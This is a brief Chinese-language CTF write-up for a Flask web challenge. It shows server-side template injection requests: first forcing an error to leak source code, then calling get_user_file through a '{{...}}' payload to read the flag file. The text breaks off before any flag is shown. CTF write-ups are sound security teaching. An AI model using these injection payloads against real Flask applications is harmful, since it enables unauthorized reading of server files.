# WEB

## 243 python题


[我是链接](http://218.76.35.75:20102)

查看源码可以发现是一个 flask python test
搜flask注入得到[flask注入](http://www.freebuf.com/articles/web/88768.html)
然后让flask报错

	http://218.76.35.75:20102/data=sleep{{person.secret}}
	故意漏写一个字母
	http://218.76.35.75:20102/data=sleep{{peron.secret}}

得到页面源码发现

	def get_user_file(f_name):
		if(f_name =='473bfa63bfeb1e673d6d151a799af923.py')
		
于是构造
	
	http://218.76.35.75:20102/?data=sleep.{{get_user_file("473bfa63bfeb1e673d6d151a799af923.py")}}
得到flag：